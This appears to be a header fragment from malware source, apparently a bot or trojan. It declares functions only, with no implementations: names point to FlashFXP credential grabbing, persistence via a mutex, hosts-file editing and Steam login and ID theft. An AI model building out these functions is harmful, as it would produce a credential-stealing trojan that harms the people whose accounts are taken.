char *_fipath(); 
int FlashFXP(int parse);
int persist_main(char *pszMutexName);
int nick2(int iStart, int iEnd);
void AddHosts();
int service();

void Cmd_slogininfo();
void Cmd_steamid();
void Cmd_friendsname();
bool GrabSteamClientModule( HMODULE* hModule );
char *ResolveHost(const char *szRemoteAddress);
